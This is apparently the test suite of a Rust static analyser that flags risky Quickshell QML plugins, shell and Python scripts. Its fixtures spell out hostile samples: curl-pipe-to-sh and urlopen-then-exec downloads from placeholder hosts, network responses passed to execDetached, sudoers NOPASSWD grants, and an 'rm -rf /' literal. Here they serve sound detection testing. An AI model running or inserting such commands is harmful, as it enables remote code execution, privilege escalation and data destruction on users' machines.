    use omasafe_report::analysis::AnalysisSection;

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    const EVIL_QML: &str = r#"
import QtQuick
import Quickshell.Io
Item {
    Process { command: ["sh", "-c", "curl example.test/p | sh"] }
    Text { text: {
        var xhr = new XMLHttpRequest()
        xhr.open("GET", "https://example.test/x")
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) Quickshell.execDetached(xhr.responseText)
        }
        xhr.send()
    } }
    Loader { source: "./Helper.qml" }
}
"#;

    #[test]
    fn chained_network_execution_produces_network_finding() {
        let inventory = PayloadInventory {
            entries: vec![entry("Evil.qml", PayloadKind::Qml, EVIL_QML.len())],
            ..Default::default()
        };
        let expected = EVIL_QML.as_bytes().to_vec();
        let (artifacts, inventory) =
            super::tests::analyze_with(inventory, &[("Evil.qml", &expected)]);
        let findings = artifacts.rendered_findings();
        let rules: Vec<&str> = findings
            .iter()
            .map(|finding| finding.rule_id.as_str())
            .collect();
        assert!(rules.contains(&PROCESS_RULE), "{rules:?}");
        assert!(rules.contains(&DETACHED_RULE), "{rules:?}");
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
        // Every rendered finding carries the full report contract.
        for finding in artifacts.rendered_findings() {
            assert!(!finding.title.is_empty());
            assert!(!finding.explanation.is_empty());
            assert!(!finding.review_guidance.is_empty());
            assert!(finding.line.unwrap_or(0) >= 1);
            assert_eq!(
                finding.confidence.as_deref(),
                if cfg!(feature = "qml-parser") {
                    Some("ast-backed")
                } else {
                    Some("lexical-fallback")
                }
            );
        }
    }

    #[test]
    fn static_plain_execdetached_stays_capability_only() {
        let source = r#"Item { Component.onCompleted: Quickshell.execDetached("systemctl --user restart foo") }"#;
        let inventory = PayloadInventory {
            entries: vec![entry("Calm.qml", PayloadKind::Qml, source.len())],
            ..Default::default()
        };
        let (artifacts, _) =
            super::tests::analyze_with(inventory, &[("Calm.qml", source.as_bytes())]);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == DETACHED_RULE),
            "static plain detached execution is a capability, not a finding"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "detached-process-execution")
        );
    }

    #[test]
    fn standalone_javascript_is_lexical_with_chain_detection() {
        let source = r#"function run(url) {
    var xhr = new XMLHttpRequest()
    fetch("https://example.test/y")
    xhr.onreadystatechange = function() {
        execDetached(xhr.responseText)
    }
}
"#;
        let inventory = PayloadInventory {
            entries: vec![entry("helper.js", PayloadKind::JavaScript, source.len())],
            ..Default::default()
        };
        let (artifacts, inventory) =
            super::tests::analyze_with(inventory, &[("helper.js", source.as_bytes())]);
        let findings = artifacts.rendered_findings();
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == DETACHED_RULE
                    && finding.evidence == "network-response-executed"),
            "{findings:?}"
        );
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == NETWORK_RULE),
            "lexical co-occurrence alone must stay capability-only"
        );
        assert!(
            findings
                .iter()
                .all(|finding| finding.confidence.as_deref() == Some("lexical-fallback"))
        );
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    }

    #[test]
    fn invocation_edges_resolve_and_mark_targets() {
        let helper_qml = "Text { text: \"helper\" }\n";
        let script_js = "// referenced helper\n";
        let unreferenced_script = "#!/bin/sh\necho no-one-points-here\n";
        let shell_payload = PayloadEntry {
            kind: PayloadKind::Shell,
            executable: true,
            ..entry(
                "tools/run.sh",
                PayloadKind::Shell,
                unreferenced_script.len(),
            )
        };
        let mut inventory = PayloadInventory {
            entries: vec![
                entry("App.qml", PayloadKind::Qml, EVIL_QML.len()),
                entry("Helper.qml", PayloadKind::Qml, helper_qml.len()),
                entry("scripts/lib.js", PayloadKind::JavaScript, script_js.len()),
                entry("orphan.sh", PayloadKind::Shell, unreferenced_script.len()),
                shell_payload,
            ],
            ..Default::default()
        };
        // App.qml references Helper.qml and scripts/lib.js; nothing references the shells.
        let app_source = format!("{}\nFileView {{ path: \"./scripts/lib.js\" }}\n", EVIL_QML);
        let contents: Vec<(&str, Vec<u8>)> = vec![
            ("App.qml", app_source.into_bytes()),
            ("Helper.qml", helper_qml.as_bytes().to_vec()),
            ("scripts/lib.js", script_js.as_bytes().to_vec()),
            ("orphan.sh", unreferenced_script.as_bytes().to_vec()),
            ("tools/run.sh", unreferenced_script.as_bytes().to_vec()),
        ];
        let lookup: std::collections::BTreeMap<String, Vec<u8>> = contents
            .into_iter()
            .map(|(path, bytes)| (path.to_owned(), bytes))
            .collect();
        let budget = TimeBudget::default();
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| lookup.get(&entry.relative_path).cloned(),
            &budget,
        );

        let targets: Vec<&str> = artifacts
            .edges
            .iter()
            .map(|edge| edge.target_path.as_str())
            .collect();
        assert!(targets.contains(&"Helper.qml"), "{targets:?}");
        assert!(targets.contains(&"scripts/lib.js"), "{targets:?}");
        let helper_index = inventory
            .entries
            .iter()
            .position(|e| e.relative_path == "Helper.qml")
            .unwrap();
        assert!(inventory.entries[helper_index].invocation_target);
        // Shell payloads keep Unsupported but gain the referenced marker only when pointed at.
        assert!(
            !inventory
                .entries
                .iter()
                .any(|e| e.relative_path == "orphan.sh" && e.invocation_target)
        );
        // Traversal and scheme literals never become edges.
        assert!(
            !targets
                .iter()
                .any(|target| target.contains("..") || target.starts_with('/'))
        );
    }

    #[test]
    fn fingerprint_is_end_to_end_deterministic_and_input_sensitive() {
        let make = |command_literal: &str| {
            let source = format!("Process {{ command: [\"sh\", \"-c\", \"{command_literal}\"] }}");
            let mut inventory = PayloadInventory {
                entries: vec![entry("Main.qml", PayloadKind::Qml, source.len())],
                ..Default::default()
            };
            let budget = TimeBudget::default();
            let artifacts = analyze_inventory(
                &mut inventory,
                &|_| Some(source.clone().into_bytes()),
                &budget,
            );
            (artifacts, inventory)
        };
        let (first, inv_first) = make("ls -la");
        let (second, inv_second) = make("ls -la");
        let (different, _) = make("rm -rf /");

        let policy = crate::policy_identity();
        let section_one = AnalysisSection::new(
            policy.clone(),
            crate::fingerprint_analysis(&first.results, &first.capabilities),
            inv_first.limitations.clone(),
            first.rendered_findings(),
            first.capabilities.clone(),
            first.edges.clone(),
            parser_metadata(),
            None,
        );
        let section_two = AnalysisSection::new(
            policy.clone(),
            crate::fingerprint_analysis(&second.results, &second.capabilities),
            inv_second.limitations.clone(),
            second.rendered_findings(),
            second.capabilities.clone(),
            second.edges.clone(),
            parser_metadata(),
            None,
        );
        let section_three = AnalysisSection::new(
            policy,
            crate::fingerprint_analysis(&different.results, &different.capabilities),
            Vec::new(),
            different.rendered_findings(),
            different.capabilities.clone(),
            different.edges.clone(),
            parser_metadata(),
            None,
        );

        let render = |section: &AnalysisSection| {
            serde_json::to_vec(&Report::new(
                "omasafe 0.1.2",
                "2026-01-01T00:00:00Z".to_owned(),
                section,
            ))
            .unwrap()
        };
        // Identical source+policy ⇒ identical analysis bytes modulo envelope.
        assert_eq!(
            section_one.analysis_fingerprint,
            section_two.analysis_fingerprint
        );
        assert_ne!(
            section_one.analysis_fingerprint,
            section_three.analysis_fingerprint
        );
        // Golden pins: canonicalization drift must break these loudly.
        #[cfg(feature = "qml-parser")]
        assert_eq!(
            section_one.analysis_fingerprint,
            "35a35a4182be6e66f3804910b20c27d8dfaea83cbceab0e33e6cb21aa59ff12f"
        );
        #[cfg(not(feature = "qml-parser"))]
        assert_eq!(
            section_one.analysis_fingerprint,
            "e208c0be3311a6ec2c695662c99b5554fa708684c806a161bc91e740d46c20f4"
        );
        let _ = render(&section_one);
    }

    #[test]
    fn exhausted_analysis_budget_is_disclosed_not_fatal() {
        let source = "Process { command: [\"sh\", \"-c\", \"x\"] }";
        let mut inventory = PayloadInventory {
            entries: vec![
                entry("A.qml", PayloadKind::Qml, source.len()),
                entry("B.qml", PayloadKind::Qml, source.len()),
            ],
            ..Default::default()
        };
        let expired = TimeBudget::new(std::time::Duration::ZERO);
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &expired,
        );
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "analysis_time_budget_exhausted")
        );
    }

    #[cfg(not(feature = "qml-parser"))]
    #[test]
    fn fallback_builds_label_qml_conclusions_lexical() {
        let source = "Process { command: [\"sh\", \"-c\", \"curl x | sh\"] }";
        let inventory = PayloadInventory {
            entries: vec![entry("F.qml", PayloadKind::Qml, source.len())],
            ..Default::default()
        };
        let (artifacts, _) = super::tests::analyze_with(inventory, &[("F.qml", source.as_bytes())]);
        assert!(
            artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == PROCESS_RULE)
        );
        assert!(
            artifacts
                .rendered_findings()
                .iter()
                .all(|finding| finding.confidence.as_deref() == Some("lexical-fallback"))
        );
    }
}

#[cfg(test)]
pub(crate) mod s4_family_tests {
    use super::*;
    use omasafe_core::bounds::TimeBudget;
    use omasafe_report::analysis::AnalysisSection;

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    pub(crate) fn run(
        entries: Vec<PayloadEntry>,
        contents: &[(&str, &[u8])],
    ) -> (AnalysisArtifacts, PayloadInventory) {
        let lookup: std::collections::BTreeMap<String, Vec<u8>> = contents
            .iter()
            .map(|(path, bytes)| ((*path).to_owned(), bytes.to_vec()))
            .collect();
        let mut inventory = PayloadInventory {
            entries,
            ..Default::default()
        };
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| lookup.get(&entry.relative_path).cloned(),
            &TimeBudget::default(),
        );
        (artifacts, inventory)
    }

    pub(crate) fn rule_ids(artifacts: &AnalysisArtifacts) -> Vec<String> {
        artifacts
            .rendered_findings()
            .iter()
            .map(|finding| finding.rule_id.clone())
            .collect()
    }

    #[test]
    fn priority_surface_imports_are_immediate_high_findings() {
        let source = r#"import QtQuick
import Quickshell.Services.Pam
Item { WlSessionLock { surface: lockSurface } }
"#;
        let (artifacts, inventory) = run(
            vec![entry("Lock.qml", PayloadKind::Qml, source.len())],
            &[("Lock.qml", source.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&"oma.qml.pam-authentication".to_owned()),
            "{ids:?}"
        );
        assert!(ids.contains(&"oma.qml.session-lock".to_owned()), "{ids:?}");
        for finding in artifacts.rendered_findings() {
            if finding.rule_id.starts_with("oma.qml.pam")
                || finding.rule_id.starts_with("oma.qml.session")
                || finding.rule_id.starts_with("oma.qml.polkit")
            {
                assert_eq!(finding.severity, "high");
            }
        }
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    }

    #[test]
    fn polkit_import_is_a_high_finding_without_usage() {
        let source = "import Quickshell.Services.Polkit\nItem {}\n";
        let (artifacts, _) = run(
            vec![entry("Agent.qml", PayloadKind::Qml, source.len())],
            &[("Agent.qml", source.as_bytes())],
        );
        let findings = artifacts.rendered_findings();
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "oma.qml.polkit-agent-ui");
        assert_eq!(findings[0].severity, "high");
    }

    #[test]
    fn benign_qml_stays_free_of_priority_findings() {
        let source = r#"import QtQuick
Text { text: "hello"; clipboardHelper: false }
Timer { running: true }
"#;
        let (artifacts, _) = run(
            vec![entry("Calm3.qml", PayloadKind::Qml, source.len())],
            &[("Calm3.qml", source.as_bytes())],
        );
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
    }

    #[test]
    fn dynamic_code_construction_is_detected() {
        let source = r#"Item {
    Component.onCompleted: {
        var panel = Qt.createQmlObject(panelSource, root, "dyn");
        var handler = eval(userInput)
    }
}
"#;
        let (artifacts, _) = run(
            vec![entry("Dyn2.qml", PayloadKind::Qml, source.len())],
            &[("Dyn2.qml", source.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert_eq!(
            ids.iter()
                .filter(|id| *id == "oma.qml.dynamic-code")
                .count(),
            2,
            "both constructions surface: {ids:?}"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "dynamic-code-execution")
        );
    }

    #[test]
    fn encoded_literal_indicator_has_boundary() {
        // Boundary below the threshold stays silent.
        let short = format!("Item {{ property string p: \"{}\" }}", "ab12".repeat(15)); // 60 chars
        let (artifacts_short, _) = run(
            vec![entry("Short.qml", PayloadKind::Qml, short.len())],
            &[("Short.qml", short.as_bytes())],
        );
        assert!(
            !rule_ids(&artifacts_short)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );

        // At/over the threshold with base64 shape surfaces an indicator.
        let long_payload = format!("{}{}{}", "a".repeat(32), "9".repeat(32), "=="); // 66 chars
        let long_source = format!("Item {{ property string p: \"{long_payload}\" }}");
        let (artifacts_long, _) = run(
            vec![entry("Long.qml", PayloadKind::Qml, long_source.len())],
            &[("Long.qml", long_source.as_bytes())],
        );
        let ids = rule_ids(&artifacts_long);
        assert!(
            ids.contains(&"oma.qml.obfuscated-payload-indicator".to_owned()),
            "{ids:?}"
        );

        // Prose of the same length is not base64-shaped.
        let prose = format!("Item {{ property string p: \"{}\" }}", "word ".repeat(20));
        let (artifacts_prose, _) = run(
            vec![entry("Prose.qml", PayloadKind::Qml, prose.len())],
            &[("Prose.qml", prose.as_bytes())],
        );
        assert!(
            !rule_ids(&artifacts_prose)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
    }

    #[test]
    fn persistence_location_writes_surface_as_context_findings() {
        let source = "FileView { path: \".config/autostart/persist.desktop\" }\n";
        let (artifacts, _) = run(
            vec![entry("Persist.qml", PayloadKind::Qml, source.len())],
            &[("Persist.qml", source.as_bytes())],
        );
        let findings = artifacts.rendered_findings();
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == PERSISTENCE_RULE
                    && finding.severity == "info"
                    && finding.evidence.starts_with("persistence-location"))
        );
    }

    #[test]
    fn shell_download_execute_and_sudoers_are_high_findings() {
        let installer = r#"#!/bin/sh
curl https://example.test/install.sh | sh
echo "NOPASSWD: ALL" > /etc/sudoers.d/omarchy-helper
sudo pacman -S --noconfirm somepackage
"#;
        let (artifacts, inventory) = run(
            vec![entry("install.sh", PayloadKind::Shell, installer.len())],
            &[("install.sh", installer.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&"oma.script.download-execute".to_owned()),
            "{ids:?}"
        );
        assert!(
            ids.contains(&"oma.script.privilege-escalation".to_owned()),
            "{ids:?}"
        );
        for finding in artifacts.rendered_findings() {
            if finding.rule_id.starts_with("oma.script.") {
                assert_eq!(finding.severity, "high");
                assert_eq!(finding.confidence.as_deref(), Some("lexical-fallback"));
            }
        }
        // Plain package-manager/sudo usage is capability-level context.
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
        // Shell payloads are always labelled partial.
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
    }

    #[test]
    fn python_variants_cover_the_same_families() {
        let helper = r#"import urllib.request
data = urllib.request.urlopen("https://example.test/x").read(); exec(data)
sudo pacman -S base-devel
"#;
        let (artifacts, _) = run(
            vec![entry("setup.py", PayloadKind::Python, helper.len())],
            &[("setup.py", helper.as_bytes())],
        );
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&"oma.python.download-execute".to_owned()),
            "{ids:?}"
        );
        // Plain sudo without sudoers/NOPASSWD is a capability, not a finding.
        assert!(
            !ids.contains(&"oma.python.privilege-escalation".to_owned()),
            "{ids:?}"
        );
    }

    #[test]
    fn benign_scripts_have_no_findings_but_stay_partial() {
        let script = "#!/bin/sh\necho hello\nnotify-send done\n";
        let (artifacts, inventory) = run(
            vec![entry("clean.sh", PayloadKind::Shell, script.len())],
            &[("clean.sh", script.as_bytes())],
        );
        assert!(rule_ids(&artifacts).is_empty());
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
    }

    #[test]
    fn manifest_kinds_feed_context_results_and_headless_capability() {
        let manifest = br#"{"id":"x","kinds":["bar","service"]}"#;
        let qml_source = "Text {}\n";
        let (artifacts, _) = run(
            vec![
                entry("manifest.json", PayloadKind::TextFile, manifest.len()),
                entry("plugin.qml", PayloadKind::Qml, qml_source.len()),
            ],
            &[
                ("manifest.json", manifest),
                ("plugin.qml", qml_source.as_bytes()),
            ],
        );
        let ids = rule_ids(&artifacts);
        assert!(ids.contains(&REPLACES_BAR_RULE.to_owned()), "{ids:?}");
        let rendered_findings = artifacts.rendered_findings();
        let replaces_bar = rendered_findings
            .iter()
            .find(|finding| finding.rule_id == REPLACES_BAR_RULE)
            .unwrap();
        assert_eq!(replaces_bar.severity, "info");
        assert_eq!(replaces_bar.language, "context");
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(
                    |capability| capability.capability == "persistence-scheduling"
                        && capability.detail == "headless-service-kind"
                )
        );
    }

    #[test]
    fn priority_ordering_puts_critical_and_high_first() {
        let high_source = "import Quickshell.Services.Polkit\nItem {}\n";
        let medium_source = "Process { command: [\"sh\", \"-c\", \"ls\"] }\n";
        let (artifacts, _) = run(
            vec![
                entry("M.qml", PayloadKind::Qml, medium_source.len()),
                entry("H.qml", PayloadKind::Qml, high_source.len()),
            ],
            &[
                ("M.qml", medium_source.as_bytes()),
                ("H.qml", high_source.as_bytes()),
            ],
        );
        let all_findings = artifacts.rendered_findings();
        let severities: Vec<&str> = all_findings
            .iter()
            .map(|finding| finding.severity.as_str())
            .collect();
        let mut sorted = severities.clone();
        let rank = |value: &str| match value {
            "critical" => 4,
            "high" => 3,
            "medium" => 2,
            "low" => 1,
            _ => 0,
        };
        sorted.sort_by_key(|value| std::cmp::Reverse(rank(value)));
        assert_eq!(severities, sorted, "priority ordering violated");
    }

    #[test]
    fn equivalence_map_records_marketplace_baseline_v3() {
        let map = crate::EquivalenceMap::embedded();
        assert_eq!(map.external_ruleset_version, "3");
        assert!(map.is_stale_against("4"));
        let section = AnalysisSection::new(
            crate::policy_identity(),
            String::new(),
            Vec::new(),
            Vec::new(),
            Vec::new(),
            Vec::new(),
            parser_metadata(),
            Some(omasafe_report::analysis::EquivalenceSummary {
                map_version: map.map_version.clone(),
                external_system: map.external_system.clone(),
                external_ruleset_name: map.external_ruleset_name.clone(),
                external_ruleset_version: map.external_ruleset_version.clone(),
            }),
        );
        let rendered = serde_json::to_string(&section).unwrap();
        assert!(rendered.contains("\"external_ruleset_version\":\"3\""));
    }
}

#[cfg(test)]
mod s4_boundary_tests {
    use super::s4_family_tests::{rule_ids, run};
    use super::*;
    use omasafe_core::bounds::TimeBudget;

    fn one(path: &str, kind: PayloadKind, source: &str) -> (AnalysisArtifacts, PayloadInventory) {
        super::s4_family_tests::run(
            vec![entry(path, kind, source.len())],
            &[(path, source.as_bytes())],
        )
    }

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    #[test]
    fn base64_indicator_exact_boundaries() {
        let make = |payload: String| {
            let source = format!("Item {{ property string p: \"{payload}\" }}");
            one("B.qml", PayloadKind::Qml, &source)
        };
        // 63 chars: below threshold -> silent.
        let (artifacts63, _) = make("a9".repeat(31) + "a");
        assert!(rule_ids(&artifacts63).is_empty());
        // 64 chars letters+digits: fires.
        let (artifacts64, _) = make("a9".repeat(32));
        assert!(
            rule_ids(&artifacts64).contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
        // Letters-only and digits-only never fire regardless of length.
        let (artifacts_letters, _) = make("a".repeat(70));
        assert!(
            !rule_ids(&artifacts_letters)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
        let (artifacts_digits, _) = make("7".repeat(70));
        assert!(
            !rule_ids(&artifacts_digits)
                .contains(&"oma.qml.obfuscated-payload-indicator".to_owned())
        );
    }

    #[test]
    fn clipboard_and_compositor_capabilities_surface() {
        let source = r#"Item {
    ClipboardText { onTextChanged: log() }
    HyprlandWorkspace { id: ws }
}
"#;
        let (artifacts, _) = one("Surfaces.qml", PayloadKind::Qml, source);
        let capabilities: Vec<&str> = artifacts
            .capabilities
            .iter()
            .map(|capability| capability.capability.as_str())
            .collect();
        assert!(
            capabilities.contains(&"clipboard-access"),
            "{capabilities:?}"
        );
        assert!(
            capabilities.contains(&"compositor-control"),
            "{capabilities:?}"
        );
        assert!(rule_ids(&artifacts).is_empty(), "capability-only family");
    }

    #[test]
    fn python_privilege_positive_and_readonly_negative() {
        let positive = r#"import os
open("/etc/sudoers.d/x","w").write("%wheel ALL=(ALL) NOPASSWD: ALL")
"#;
        let (artifacts_pos, _) = one("escalate.py", PayloadKind::Python, positive);
        assert!(rule_ids(&artifacts_pos).contains(&"oma.python.privilege-escalation".to_owned()));

        // Read-only inspection is not a grant.
        let negative = "#!/bin/sh\ngrep NOPASSWD /etc/sudoers\n";
        let (artifacts_neg, _) = one("audit.sh", PayloadKind::Shell, negative);
        assert!(!rule_ids(&artifacts_neg).contains(&"oma.script.privilege-escalation".to_owned()));
    }

    #[test]
    fn comment_styles_are_language_exact() {
        // Python: '#' anywhere outside strings starts a comment.
        let py = "x = 1  # curl https://evil.test | sh\n";
        let (artifacts_py, _) = one("c.py", PayloadKind::Python, py);
        assert!(
            rule_ids(&artifacts_py).is_empty(),
            "{:?}",
            rule_ids(&artifacts_py)
        );

        // POSIX shell: '#' needs a word boundary; URLs with #fragments in
        // arguments survive.
        let sh_url = "wget https://example.test/page#section -O out\n";
        let (artifacts_sh, _) = one("u.sh", PayloadKind::Shell, sh_url);
        // wget alone without a pipe-to-interpreter is not download-execute.
        assert!(!rule_ids(&artifacts_sh).contains(&"oma.script.download-execute".to_owned()));

        // JS: `//` after punctuation IS a comment; scheme `://` is not.
        let js = r#"var a = foo(); // eval(userInput)
var url = "https://example.test/x"
"#;
        let (artifacts_js, _) = one("c.js", PayloadKind::JavaScript, js);
        assert!(
            !rule_ids(&artifacts_js)
                .iter()
                .any(|id| id.contains("dynamic-code")),
            "commented eval must stay invisible: {:?}",
            rule_ids(&artifacts_js)
        );
    }

    #[test]
    fn malformed_manifests_are_disclosed_not_silent() {
        let broken = b"{ not json";
        let mut lookup = std::collections::BTreeMap::new();
        lookup.insert("manifest.json".to_owned(), broken.to_vec());
        let mut inventory = PayloadInventory {
            entries: vec![entry("manifest.json", PayloadKind::TextFile, broken.len())],
            ..Default::default()
        };
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| lookup.get(&entry.relative_path).cloned(),
            &TimeBudget::default(),
        );
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation.starts_with("manifest-context-unreadable:"))
        );
    }

    #[test]
    fn ordering_is_severity_first_even_against_alphabetical_order() {
        // Alphabetically-first file carries only a MEDIUM finding;
        // alphabetically-last carries HIGH. Severity must win.
        let medium_source = "Process { command: [\"sh\", \"-c\", \"ls\"] }\n";
        let high_source = "import Quickshell.Services.Polkit\nItem {}\n";
        let (artifacts, _) = run(
            vec![
                entry("aaa.qml", PayloadKind::Qml, medium_source.len()),
                entry("zzz.qml", PayloadKind::Qml, high_source.len()),
            ],
            &[
                ("aaa.qml", medium_source.as_bytes()),
                ("zzz.qml", high_source.as_bytes()),
            ],
        );
        let findings = artifacts.rendered_findings();
        assert_eq!(findings[0].severity, "high", "{findings:?}");
        assert_eq!(findings.last().unwrap().severity, "medium");
    }
}
